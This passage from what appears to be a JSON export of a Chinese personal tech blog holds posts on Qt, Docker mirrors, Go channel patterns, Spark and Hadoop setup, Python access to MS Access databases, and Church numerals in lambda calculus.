IPv4pattern(\"\\\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\\\.)&#123;3&#125;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\\\b\");QRegExp IPv4rx(IPv4pattern);if (IPv4rx.exactMatch(\"8.8.8.8\"))&#123; // example for IPv4 address check&#125; 参考文献： Qt图标修改 Qt Windows部署 Qt 多个数据库文件操作 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/09/14/tips-for-qt/) 、作者信息（Forec）和本声明。","categories":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}],"tags":[{"name":"Mistakes","slug":"Mistakes","permalink":"http://forec.github.io/tags/Mistakes/"},{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"},{"name":"Qt","slug":"Qt","permalink":"http://forec.github.io/tags/Qt/"},{"name":"字符编码","slug":"字符编码","permalink":"http://forec.github.io/tags/字符编码/"},{"name":"线程","slug":"线程","permalink":"http://forec.github.io/tags/线程/"}],"keywords":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}]},{"title":"Docker配置策略备忘","slug":"docker-problems","date":"2016-09-08T16:33:36.000Z","updated":"2016-11-04T16:44:46.000Z","comments":true,"path":"2016/09/09/docker-problems/","link":"","permalink":"http://forec.github.io/2016/09/09/docker-problems/","excerpt":"整理Docker的配置，以及遇到问题的解决方案。","text":"整理Docker的配置，以及遇到问题的解决方案。 Docker更新Ubuntu被墙 把/etc/apt/sources.list中的 http://archive.ubuntu.com 全部替换为 http://mirrors.ustc.edu.cn。 编辑Dockfile文件，添加以下语句更新image resp中的Ubuntu，替换源为中科大镜像。 123456FROM resp:latestRUN cp /etc/apt/sources.list /etc/apt/sources.list.bakRUN sudo sed -i 's/archive.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.listRUN cat /etc/apt/sources.listRUN apt-get cleanRUN apt-get -y update --fix-missing &amp;&amp; apt-get install -y ******(apps you want to install) 执行docker build -t newresp .安装新功能。 设置Docker镜像 新版的 Docker 使用 /etc/docker/daemon.json（Linux） 或者 %programdata%\\docker\\config\\daemon.json（Windows） 来配置 Daemon。 在该配置文件中加入（没有该文件，则创建一个）： 123&#123; \"registry-mirrors\": [\"https://docker.mirrors.ustc.edu.cn\"]&#125; Windows下更改Docker的虚拟机、镜像位置 设置环境变量 MACHINE_STORAGE_PATH 为要存储所有 docker 文件的位置。 如尚未安装 docker，安装即更改默认位置。 如已安装 docker，在bash窗口中docker-machine ls查看已有的docker虚拟机，docker-machine create --driver=virtualbox newDockerName即可新建一个虚拟机，新建后可docker-machine rm default删除原有的默认虚拟机，并在新位置新建一个名为default的虚拟机。 docker-machine regenerate-certs default重新生成证书。 重新执行Docker Quick Terminal。 精简版Ubuntu待安装软件列表 ping: inetutils-ping ifconfig: net-tools 参考文献： Docker镜像使用帮助 Ubuntu镜像使用帮助 Docker下Ubuntu Update错误 Windows下修改Docker Images位置 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/09/09/docker-problems/) 、作者信息（Forec）和本声明。","categories":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://forec.github.io/tags/Docker/"},{"name":"Mistakes","slug":"Mistakes","permalink":"http://forec.github.io/tags/Mistakes/"}],"keywords":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}]},{"title":"Golang的通道技巧","slug":"gochan-accumulate","date":"2016-09-08T02:33:31.000Z","updated":"2016-11-04T13:23:10.000Z","comments":true,"path":"2016/09/08/gochan-accumulate/","link":"","permalink":"http://forec.github.io/2016/09/08/gochan-accumulate/","excerpt":"整理近期遇到的Golang中通道和协程的技巧。","text":"整理近期遇到的Golang中通道和协程的技巧。 计时器及系统负荷均衡 time 包中的 time.Ticker 结构体，该对象以指定的时间间隔重复向结构体中的通道C发送时间值，通道C对用户只读，该对象可通过工厂函数 time.NewTicker(dur int64) 创建， dur是指定的时间间隔，单位为纳秒（ns）。在使协程周期性执行任务（打印状态日志，输出等）时使用。调用 Stop() 使计时器停止，与 select 结合如下： 12345678910111213ticker := time.NewTicker(updateInterval)defer ticker.Stop()...select &#123;case u:= &lt;-ch1: ...case v:= &lt;-ch2: ...case &lt;-ticker.C: logState(status) // call some logging function logStatedefault: // no value ready to be received ...&#125; time.Tick() 函数声明为 Tick(d Duration) &lt;-chan Time，该函数返回的通道不需要关闭，它以 d 为周期给返回的通道发送时间，d 是纳秒数。可以通过此函数限制处理频率，如果应对的请求不平稳，可以增加一个带缓冲的可读写通道，从 chRate 中读取处理时钟，在请求暴增时可以快速处理与缓冲数相等的请求，之后处理速度会下降到和 chRate 一样的速率。 12345678import \"time\"rate_per_sec := 10var dur Duration = 1e9 / rate_per_secchRate := time.Tick(dur) // a tick every 1/10th of a secondfor req := range requests &#123; &lt;- chRate // rate limit our Service.Method RPC calls go client.Call(\"Service.Method\", req, ...)&#125; 定时器（Timer）定时器和计时器（Ticker）结构体类似（构造函数为 NewTimer(d Duration)），但它只发送一次时间，在 Dration d 之后。 time.After(d) 函数声明为 func After(d Duration) &lt;-chan Time，在 Duration d 之后，当前时间被发到返回的通道；因此它和 NewTimer(d).C 等价；它类似 Tick()，但 After() 只发送一次时间。可以使用此函数应对简单的超时模式，以下为三种形式。 要执行某个任务（如从通道 ch 中读取数据），但最多等待1秒。先创建一个信号通道，之后启动一个 lambda 协程，协程在给通道发送数据前休眠： 123456789101112timeout := make(chan bool, 1)go func() &#123; time.Sleep(1e9) // one second timeout &lt;- true&#125;()select &#123; case &lt;-ch: // a read from ch has occured case &lt;-timeout: // the read from ch has timed out break&#125; 用 time.After() 函数替换 timeout-channel。可以在 select 中使用来让发送信号超时或停止协程的执行。以下代码，在 timeoutNs 纳秒后执行 select 的 timeout 分支后，包含client.Call 的lambda 协程也随之结束，不会给通道 ch 返回值。缓冲大小设置为 1 是必要的，可以避免协程死锁以及确保超时的通道可以被垃圾回收。需要注意如果 select 中的某些非定时器选项的通道读写密集，则可能无法结束这些进程。这种情况如果将 select 放到一个 for 循环中，也无法精确地在定时器通道写入时就结束，因为 select 对可以执行的多个 case 采取伪随机算法选择，可能结束进程的时间要比定时器发出信号略晚一些。 123456789ch := make(chan error, 1)go func() &#123; ch &lt;- client.Call(\"Service.Method\", args, &amp;reply) &#125; ()select &#123;case &lt;-time.After(timeoutNs): // call timed out breakcase resp := &lt;-ch // use resp and reply&#125; 假设程序从多个复制的数据库同时读取，只需要接收首先到达的答案，Query 函数获取数据库的连接切片，并行请求每一个数据库并返回收到的第一个响应。结果通道 ch 必须是带缓冲的，以保证第一个发送进来的数据有地方可以存放，确保放入的首个数据总会成功： 123456789101112func Query(conns []conn, query string) Result &#123; ch := make(chan Result, 1) for _, conn := range conns &#123; go func(c Conn) &#123; select &#123; case ch &lt;- c.DoQuery(query): default: &#125; &#125;(conn) &#125; return &lt;- ch&#125; 缓冲通道实现信号量模式*使用缓冲通道模拟信号量，需满足 带缓冲通道的容量和要同步的资源容量相同 通道的长度（当前存放的元素个数）与当前资源被使用的数量相同 容量减去通道的长度就是未处理的资源个数（标准信号量的整数值） 创建一个可缓冲通道表示单一信号量。 12type Empty interface &#123;&#125;type semaphore chan Empty 将可用资源的数量N来初始化信号量 semaphore：sem = make(semaphore, N)，提供方法从信号量通道中读取、写入。 12345678910111213// acquire n resourcesfunc (s semaphore) P(n int) &#123; e := new(Empty) for i := 0; i &lt; n; i++ &#123; s &lt;- e &#125;&#125;// release n resoucesfunc (s semaphore) V(n int) &#123; for i:= 0; i &lt; n; i++&#123; &lt;- s &#125;&#125; 一个互斥的例子： 1234567891011121314/* mutexes */func (s semaphore) Lock() &#123; s.P(1)&#125;func (s semaphore) Unlock()&#123; s.V(1)&#125;/* signal-wait */func (s semaphore) Wait(n int) &#123; s.P(n)&#125;func (s semaphore) Signal() &#123; s.V(1)&#125; 管道过滤 从通道接收的数据并发送给输出通道，可过滤符合条件的数据。 12345678910sendChan := make(chan int)reciveChan := make(chan string)go filter(sendChan, receiveChan)func filter(in &lt;-chan int, out chan&lt;- string) &#123; for inValue := range in &#123; result := ... /// processing inValue out &lt;- result &#125;&#125; 协程的恢复 以下代码停掉了服务器内部一个失败的协程而不影响其他协程的工作。 1234567891011121314func server(workChan &lt;-chan *Work) &#123; for work := range workChan &#123; go safelyDo(work) // start the goroutine for that work &#125;&#125;func safelyDo(work *Work) &#123; defer func &#123; if err := recover(); err != nil &#123; log.Printf(\"Work failed with %s in %v\", err, work) &#125; &#125;() do(work)&#125; 参考文献： 《The Way To Go》中文译本 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/09/08/gochan-accumulate/) 、作者信息（Forec）和本声明。","categories":[{"name":"Language","slug":"Language","permalink":"http://forec.github.io/categories/Language/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://forec.github.io/tags/Golang/"}],"keywords":[{"name":"Language","slug":"Language","permalink":"http://forec.github.io/categories/Language/"}]},{"title":"Spark集群计算环境配置和使用","slug":"spark-initial","date":"2016-07-11T06:53:38.000Z","updated":"2016-11-04T16:45:16.000Z","comments":true,"path":"2016/07/11/spark-initial/","link":"","permalink":"http://forec.github.io/2016/07/11/spark-initial/","excerpt":"在Hadoop配置与使用基础上配置Spark集群计算环境，以及简单Scala程序在集群的运行。","text":"在Hadoop配置与使用基础上配置Spark集群计算环境，以及简单Scala程序在集群的运行。 在Hadoop通用并行框架上配置Spark 从Apache Spark下载合适的版本，以Pre-build for Hadoop 2.6为例，将压缩包解压到某目录，该压缩包目录作为环境变量SPARK_HOME。 向环境变量添加%SPARK_HOME%/bin并source生效。 将%HADOOP_HOME%\\etc\\hadoop作为HADOOP_CONF_DIR添加到环境变量。 按Hadoop集群的运行方式启动Hadoop 1234bin/hdfs namenode -formatbin/hdfs dfs -mkdir /user/&lt;username&gt;sbin/start-dfs.shsbin/start-yarn.sh 在Hadoop集群上执行Spark作业一个Scala的MapReduce样本 此样例为多维属性向量的均值计算 1234567891011121314import org.apache.spark.&#123;SparkConf, SparkContext&#125;import org.apache.spark.rdd.RDDobject Statistic &#123; def main(args: Array[String]) &#123; val conf = new SparkConf().setAppName(\"example\") val spark = new SparkContext(conf) val set = spark.textFile(args(0)).flatMap &#123; line =&gt; line.split(\" \").map &#123; opt =&gt; (opt.split(\":\")(0).toInt, opt.split(\":\")(1).toFloat) &#125; &#125;.reduceByKey(_+_) val count = set.count() set.collect.map &#123; case (key, value) =&gt; value/count&#125;.foreach&#123;println&#125; spark.stop() &#125;&#125; 样例代码中，set为(Int, Float)的&lt;key, value&gt;对的RDD，通过reduceByKey将相同属性求和，在最后collect回收所有分布式集群上的结果汇总到本地。 执行作业 将要执行的代码export为jar包，一下文件名为example.jar。 ssh到localhost（此处使用伪分布式Hadoop集群）。 执行如下命令，其中path_to_example_jar为jar包所在的位置，MainClass为jar包中要执行的object，args为传入MainClass的参数列表，空格隔开，可变长。 1spark-submit --class MainClass --master yarn-cluster path_to_example_jar args... 执行作业后可在Hadoop监视器的logs中看到输出。 Scala的部分Spark API API文档根目录：http://spark.apache.org/docs/1.5.1/api/scala/index.html#package &lt;key, value&gt;类型的RDD：http://spark.apache.org/docs/1.5.1/api/scala/index.html#org.apache.spark.rdd.PairRDDFunctions 所有RDD：http://spark.apache.org/docs/1.5.1/api/scala/index.html#org.apache.spark.rdd.RDD 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/07/11/spark-initial/) 、作者信息（Forec）和本声明。","categories":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}],"tags":[{"name":"Hadoop","slug":"Hadoop","permalink":"http://forec.github.io/tags/Hadoop/"},{"name":"Spark","slug":"Spark","permalink":"http://forec.github.io/tags/Spark/"}],"keywords":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}]},{"title":"Python3操作Access数据库","slug":"python-visit-access-database","date":"2016-07-10T08:45:29.000Z","updated":"2016-11-05T11:00:38.000Z","comments":true,"path":"2016/07/10/python-visit-access-database/","link":"","permalink":"http://forec.github.io/2016/07/10/python-visit-access-database/","excerpt":"记录在windows 10下配置python3链接access数据库过程和几个简单操作。","text":"记录在windows 10下配置python3链接access数据库过程和几个简单操作。 安装所需库文件 从https://sourceforge.net/projects/pywin32/下载最新的对应本地python3版本的pywin32库并安装。 从https://www.microsoft.com/zh-cn/download/下载Access数据库驱动AccessDatabaseEngine_X64.exe。 读取Access数据库建立连接 通过以下交互命令同access数据库建立连接 1234import win32com.clientconn = win32com.client.gencache.EnsureDispatch('ADODB.Connection') DSN = 'PROVIDER = Microsoft.ACE.OLEDB.12.0;DATA SOURCE = /path/to/database;'conn.Open(DSN) 访问数据库中名为rs_name的表 123rs = win32com.client.Dispatch(r'ADODB.Recordset')rs_name = 'co' rs.Open('[' + rs_name + ']', conn, 1, 1) # 不允许更新，用于查询 注意在上面的代码中，rs.Open()的最后两个参数，分别是游标(CursorType)和数据锁定类型(LockType)。 游标为0：为仅向前游标，只读，只能向前浏览记录，不支持分页、Recordset、BookMark 游标为1：为键集游标，只读，其他用户对数据库做的修改将反映到记录集中，但其他用户增加或删除记录不会反映到记录集中。支持分页、Recordset、BookMark 游标为2：为动态游标，可读写，功能最强，但耗资源最多。用户对记录做的修改，增加或删除记录都将反映到记录集中。支持全功能浏览。 游标为3：为静态游标，可读写，只是数据的一个快照，用户对记录做的修改，增加或删除记录都不会反映到记录集中。支持向前或向后移动。 数据锁定类型为1：默认锁定，只读，不能做任何修改 数据锁定类型为2：悲观锁定，当编辑时立刻锁定记录 数据锁定类型为3：乐观锁定，直到使用update方法提交更新记录后才锁定记录 数据锁定类型为4：批量乐观锁定，允许修改多个记录，只有调用UpdateBatch方法后才锁定记录。当不需要改动任何记录时，使用只读的记录集，这样提供者不用做任何检测。 命令执行 执行SQL语句，以插入表为例 12sql_statement = \"Insert INTO [Table_Name] ([Field_1], [Field_2]) VALUES ('data1', 'data2')\"conn.Execute(sql_statement) 遍历数据库记录，rs.MoveFirst() 访问数据库的第一行记录，rs.MoveNext() 转移到下一行。注意如果第一个记录为空，则 rs.MoveFirst() 会产生一个错误，如果此前将rs的 Cursorlocation 设置为3，则此问题可解决。 123456rs.MoveFirst()while True: if rs.EOF: break else: rs.MoveNext() 查看数据，在下面的例子中，打开的表格中，第一列的名称为ID，第一行数据的ID为001，第二行数据的ID为002。 12345678&gt;&gt;&gt; rs.MoveFirst()&gt;&gt;&gt; print(rs.Fields.Item(0).Name)'ID'&gt;&gt;&gt; print(rs.Fields.Item(0).Value)'001'&gt;&gt;&gt; rs.MoveNext()&gt;&gt;&gt; print(rs.Fields.Item(0).Value)'002' 表的列数可通过 rs.Fields.Count 获取。 参考博客： Python连接Access数据库 Python读取mdb文件 win32com用法_杜雪峰的博客 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/07/10/python-visit-access-database/) 、作者信息（Forec）和本声明。","categories":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}],"tags":[{"name":"Access","slug":"Access","permalink":"http://forec.github.io/tags/Access/"},{"name":"Python","slug":"Python","permalink":"http://forec.github.io/tags/Python/"}],"keywords":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}]},{"title":"Hadoop配置和使用","slug":"hadoop-build","date":"2016-07-09T12:56:27.000Z","updated":"2017-07-26T04:31:50.000Z","comments":true,"path":"2016/07/09/hadoop-build/","link":"","permalink":"http://forec.github.io/2016/07/09/hadoop-build/","excerpt":"简单记录在Ubuntu Linux上搭建本地伪分布式的Hadoop MapReduce集群过程及使用方法。","text":"简单记录在Ubuntu Linux上搭建本地伪分布式的Hadoop MapReduce集群过程及使用方法。 安装并配置hadoop安装Hadoop及需要的工具 jdk 1.7或以上版本：http://www.oracle.com/technetwork/java/javase/downloads/index.html，并配置JAVA_HOME环境变量。 hadoop稳定版本，下文以2.6.4为例：http://hadoop.apache.org/releases.html，下载编译好的binary压缩包，解压到某目录，如/home/forec/hadoop-2.6.4，并设置HADOOP_HOME，如在/etc/environment中添加export HADOOP_HOME=/home/forec/hadoop-2.6.4/。 sudo apt-get install ssh sudo apt-get install rsync 设置环境变量 在%HADOOP_HOME%/etc/hadoop目录下的hadoop-env.sh中添加export JAVA_HOME=/path/to/jdk。 在/etc/environment中添加export HADOOP_PREFIX=/home/forec/hadoop-2/6/4/。 下面的操作均在HADOOP_HOME目录下进行。 本地非分布式操作 在默认模式下，hadoop被配置为非分布式的运行模式，以单独的java进程运行，适合debug。以下命令演示以非分布式方式在hadoop上运行。 执行下面命令启动本地hadoop作业 1234mkdir /dir_for_inputcp /source_dir_for_input /dir_for_inputbin/hadoop jar jar_to_run /dir_for_input /dir_for_outputcat /dir_for_output/* 本地伪分布式操作 hadoop可被配置为一个单个节点的伪分布式系统，每一个虚拟操作以单独的java进程运行。 修改配置文件 修改etc/hadoop/core-site.xml如下。 123456&lt;configuration&gt; &lt;property&gt; &lt;name&gt;fs.defaultFS&lt;/name&gt; &lt;value&gt;hdfs://localhost:9000&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 修改etc/hadoop/hdfs-site.xml如下。 123456&lt;configuration&gt; &lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;1&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 配置无密钥ssh登录localhost：尝试ssh localhost，若需输入密码，则通过下面命令免除输入密码的操作。其中如果本地已经生成了ssh密钥可以省略。 12ssh-keygen -t dsa -P '' -f ~/.ssh/id_dsa cat ~/.ssh/id_dsa.pub &gt;&gt; ~/.ssh/authorized_keys 在本地启动hadoop 格式化文件系统: $ bin/hdfs namenode -format。 启动NameNode和DataNode: sbin/start-dfs.sh，其log文件写入%HADOOP_HOME%/logs。 访问地址http://localhost:50070可以看到NameNode的网页接口，如下图。 将地址栏的http://localhost:50070/dfshealth.***改成http://localhost:50070/dfshealth.jsp可进入文件系统，如下图。 建立HDFS目录以执行MapReduce任务：$ bin/hdfs dfs -mkdir /user，$ bin/hdfs dfs -mkdir /user/&lt;username&gt;。 将输入文件拷贝到分布式文件系统中: $ bin/hdfs dfs -put /local_dir_for_input_files /dir_in_distributed_filesystem_for_input。 注意上面的/dir_in_distributed_filesystem_for_input是分布式文件系统中输入文件的目录，此命令将本地的输入文件拷贝到了分布式文件系统的该目录中。 运行jar包: $ bin/hadoop jar jar_file_to_excute /dir_in_distributed_filesystem_for_input /dir_in_distributed_filesystem_for_output。 检查输出文件可以通过将分布式文件系统中的输出文件拷贝到本地，或直接在分布式文件系统中查看。拷贝到本地执行如下命令：$ bin/hdfs dfs -get /dir_in_distributed_filesystem_for_output /local_dir，$ cat /local_dir/*；在分布式文件系统查看执行如下命令：$ bin/hdfs dfs -cat /dir_in_distributed_filesystem_for_output/*。 任务完成后终止hadoop虚拟机：$ sbin/stop-dfs.sh。 在YARN执行MapReduce作业 需要完成前面“在本地启动hadoop”的配置中1～4步。 修改etc/hadoop/mapred-site.xml，此文件在2.6.4版本中不存在，可以修改etc/hadoop/mapred-site.xml.template并新建该文件。 123456&lt;configuration&gt; &lt;property&gt; &lt;name&gt;mapreduce.framework.name&lt;/name&gt; &lt;value&gt;yarn&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 修改etc/hadoop/yarn-site.xml。 123456&lt;configuration&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt; &lt;value&gt;mapreduce_shuffle&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 启动资源管理器和节点管理器：$ sbin/start-yarn.sh。 启动浏览器，访问http://localhost:8088/，可以查看hadoop的资源监视器，如下图。 按上面执行hadoop的方式执行一个MapReduce任务。 作业完成后关闭虚拟机：$ sbin/stop-yarn.sh。 需要注意，在伪分布式的hadoop上执行MapReduce任务时，需ssh到localhost，之后在8088端口才能看到作业记录。 Spark 测试 Spark 自带的 Pi 测试： 12345678# spark local/opt/spark-1.6.3/bin/spark-submit --class org.apache.spark.examples.SparkPi /opt/spark-1.6.3/lib/spark-examples-1.6.3-hadoop2.6.0.jar 10# spark yarn client/opt/spark-1.6.3/bin/spark-submit --class org.apache.spark.examples.SparkPi --master yarn /opt/spark-1.6.3/lib/spark-examples-1.6.3-hadoop2.6.0.jar 10# spark yarn cluster/opt/spark-1.6.3/bin/spark-submit --class org.apache.spark.examples.SparkPi --master yarn --deploy-mode cluster /opt/spark-1.6.3/lib/spark-examples-1.6.3-hadoop2.6.0.jar 10 出现 slave lost 的问题，可能是 这里 导致的问题，在 etc/hadoop/yarn-site.xml 中加入: 123456789&lt;property&gt; &lt;name&gt;yarn.nodemanager.pmem-check-enabled&lt;/name&gt; &lt;value&gt;false&lt;/value&gt;&lt;/property&gt;&lt;property&gt; &lt;name&gt;yarn.nodemanager.vmem-check-enabled&lt;/name&gt; &lt;value&gt;false&lt;/value&gt;&lt;/property&gt; 完整的hadoop作业运行示例 安装并配置好hadoop，执行$ sbin/start-yarn.sh和$ sbin/start-dfs.sh。 一段简单的java代码如下，export出的jar包可在hadoop上执行MapReduce作业。使用eclipse或idea时，需要导入SDK、JDK和scala-hadoop-assembly包。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package test;import java.io.IOException;import java.util.ArrayList;import java.util.Iterator;import java.util.List;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class test &#123; /*********************** Map **********************/ public static class Map extends Mapper&lt;Object,Text,Text,Text&gt;&#123; protected void setup(Context context)&#123;&#125; protected void map(Object key,Text value,Context context) throws IOException, InterruptedException&#123; // Map Progress &#125; protected void cleanup(Context context)&#123;&#125; &#125; //-----shuffle ===&gt; [key,value-list] /*********************** Reduce **********************/ public static class Reduce extends Reducer&lt;Text,Text,Text,Text&gt;&#123; protected void setup(Context context)&#123;&#125; protected void reduce(Text key,Iterable&lt;Text&gt; values,Context context) throws IOException, InterruptedException&#123; // Reduce Progress // context.write(***); &#125; protected void cleanup(Context context)&#123;&#125; &#125; /*********************** Main **********************/ public static void main(String[] args) throws IllegalArgumentException, IOException, ClassNotFoundException, InterruptedException&#123; Configuration conf = new Configuration(); Job job = Job.getInstance(conf, \"forec\"); job.setJarByClass(myson.class); //*********set Map************* job.setMapperClass(Map.class); job.setMapOutputKeyClass(Text.class); job.setMapOutputValueClass(Text.class); //******** set Reduce ************ job.setReducerClass(Reduce.class); job.setOutputKeyClass(Text.class); job.setOutputValueClass(Text.class); //********* delete output ********* FileSystem fstm = FileSystem.get(conf); Path outDir = new Path(args[1]); if(!outDir.equals(\"\")) fstm.delete(outDir, true); //********** set input/output path*********** FileInputFormat.addInputPath(job, new Path(args[0])); FileOutputFormat.setOutputPath(job, new Path(args[1])); job.waitForCompletion(true); &#125;&#125; 生成的jar包即可通过上述执行方式运行在hadoop上。 参考文献： Hadoop官方文档 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/07/09/hadoop-build/) 、作者信息（Forec）和本声明。","categories":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}],"tags":[{"name":"Hadoop","slug":"Hadoop","permalink":"http://forec.github.io/tags/Hadoop/"}],"keywords":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}]},{"title":"对丘奇整数的一点思路整理","slug":"church-count","date":"2016-03-24T08:08:22.000Z","updated":"2016-11-17T06:11:26.000Z","comments":true,"path":"2016/03/24/church-count/","link":"","permalink":"http://forec.github.io/2016/03/24/church-count/","excerpt":"记录自己在理解sicp习题2.6中Church计数时的思考过程，对术语的定义均来自wiki。谨记函数为一等公民，过程即数据。","text":"记录自己在理解sicp习题2.6中Church计数时的思考过程，对术语的定义均来自wiki。谨记函数为一等公民，过程即数据。 λ演算 λ演算由阿隆佐·丘奇和他的学生在20世纪30年代引入，对函数式编程语言有巨大的影响。λ演算之通用在于，任何一个可计算函数都能用这种形式来表达和求值。λ演算强调的是变换规则的运用，而非实现它们的具体机器。 在λ演算中，每个表达式都代表一个函数，该函数接受一个参数并返回一个值，且无论参数还是返回值均为一个单参函数。即λ演算中存在且仅存在一种类型，为单参函数。对于现实中看起来接受两个参数的函数，实质为一个接受单一参数并返回接受另一个“接受单一参数”的函数，即柯里化。 在sicp的习题2.6中，对Church计数的0和add-1定义如下。 1234(define zero (lambda (f) (lambda (x) x)))(define (add-1 n) (lambda (f) (lambda (x) (f ((n f) x))))) 对上面的代码而言，通过柯里化转换成如下格式可能较易理解。但上面的形式复合λ演算的定义，即全部通过单参匿名函数实现。 123(define zero (lambda (f x) (x)))(define (add-1 n) (lambda (f x) (f (n f x)))) 形式化描述 λ演算的非形式化描述通过λ表达式匿名定义，如函数\\(f(x)=x+2\\)的表示为\\(\\lambda x.x+2\\)或\\(\\lambda y.y+2\\)，参数名无关紧要），\\(f(3)\\)即\\(3+2\\)可表示为\\((\\lambda x.x+2) 3\\)，也可以表示为\\((\\lambda f.f 3)(\\lambda x.x+2)\\)，这三者等价。然而并非所有的lambda表达式都可以规约成某种通用的函数，例如考虑\\((\\lambda x.x x)(\\lambda x.x x)\\)，其不具有确定值。 对λ演算的形式化定义为，从一个标识符的可数无穷集合开始，如\\({a, b, c, \\ldots, x, y, …}\\)，则所有的λ表达式可以通过下述上下文无关文法描述，前两条规则用来生成函数，第三条描述了函数对参数的作用方式。其中函数定义为左结合，且λ操作符绑定到它后面的整个表达式，因此括号在无歧义情况下可以舍弃。 &lt;表达式&gt; ::= &lt;标识符&gt; &lt;表达式&gt; ::=(λ&lt;标识符&gt; .&lt;表达式&gt;) &lt;表达式&gt; ::=(&lt;表达式&gt; &lt;表达式&gt;) 以上λ表达式并未定义函数，例如\\(\\lambda x.(x y)\\)中变量y的出现时自由的，其并未被绑定到表达式的任何一个λ上。一个λ表达式的自由变量的集合通过下面规则定义，分别对应上面形式化定义的各点。 在表达式\\(V\\)中，V为变量，则该表达式自由变量的集合只有V。 在表达式\\(\\lambda V .E\\)中（V为变量，E是另一个表达式），自由变量的集合为E中自由变量的集合减去变量V。因此E中的V被绑定在λ上。例如\\(\\lambda x.x\\)，将第一个x视为变量，第二个x视为表达式，则其自由变量集合为空集。 在表达式\\((E E’)\\)中，自由变量的集合石E和E’中自由变量集合的并集。例如\\(\\lambda x.x x\\)，可以看作\\(((\\lambda x.x)(x))\\)，因此自由变量集合为\\({x}\\)。 归约 根据λ演算的形式化定义，可以在λ表达式的集合上定义等价关系，即表述：“两个表达式其实表示的是同一个函数”。 α-变换：被绑定变量的名称是不重要的。具体陈述为：若V与W均为变量，E是一个λ表达式，同时E[V:=W]是指把表达式E中的所有的V的自由出现都替换为W，那么在W不是E中的一个自由出现，且如果W替换了V，W不会被E中的λ绑定的情况下，有λV.E == λW.E[V:=W] β-归约：其表达的是函数作用的概念。陈述了若所有的E’的自由出现在E [V:=E’]中仍然是自由的情况下，有((λV.E) E&#39;) == E [V:=E&#39;]成立。 η-变换：表达的是外延性的概念，即两个函数对于所有的参数得到的结果都一致，当且仅当它们是同一个函数。 丘奇整数 丘奇整数是将自然数用高阶函数展示的一种形式。它将自然数n表示为任意给定函数f自身的n重复合。所有的丘奇整数都是接受两个参数的函数，可以通过λ演算定义如下。 1234560 ≡ λf.λx. x1 ≡ λf.λx. f x2 ≡ λf.λx. f (f x)3 ≡ λf.λx. f (f (f x))...n ≡ λf.λx. fn x 对于sicp给出的0和add定义，可以用haskell表示，并用:t查看其type。 12345678Prelude&gt; let zero = (\\f -&gt; \\x -&gt; x)Prelude&gt; :t zerozero :: t -&gt; t1 -&gt; t1Prelude&gt; let add1 n = (\\f -&gt; \\x -&gt; f ((n f) x))Prelude&gt; :t add1add1 :: ((t1 -&gt; t) -&gt; t2 -&gt; t1) -&gt; (t1 -&gt; t) -&gt; t2 -&gt; tPrelude&gt; :t (add1 zero)(add1 zero) :: (t1 -&gt; t) -&gt; t1 -&gt; t 由此可以得出1、2、3的定义： 12345(define one (add-1 zero)(define one (lambda (f x) (f x))(define one (lambda (f) (lambda (x) (f x))))(define two (lambda (f) (lambda (x) (f (f x)))))(define three (lambda (f) (lambda (x) (f (f (f x)))))) 回头看add-1的最初定义，已经感受到一致性：对n做add-1，就是对n所代表的过程再复合指定的函数f。这与丘奇整数的值和其复合指数相同一致。 12(define (add-1 n) (lambda (f) (lambda (x) (f ((n f) x))))) 下面是haskell对丘奇整数和整数之间转换的函数。 12345678type Church a = (a -&gt; a) -&gt; a -&gt; achurch :: Integer -&gt; Church Integerchurch 0 = \\f -&gt; \\x -&gt; xchurch n = \\f -&gt; \\x -&gt; f (church (n-1) f x)unchurch :: Church Integer -&gt; Integerunchurch cn = cn (+ 1) 0 丘奇函数加深了对高阶函数、数据的过程性和书中“总可以将数据定义为一组适当的选择函数和构造函数，以及为使这些过程成为一套合法表示，他们就必须满足的一组特定条件”的认识。日后对λ演算做深入学习时再作补充。 参考文献： 《计算机程序的构造和解释》 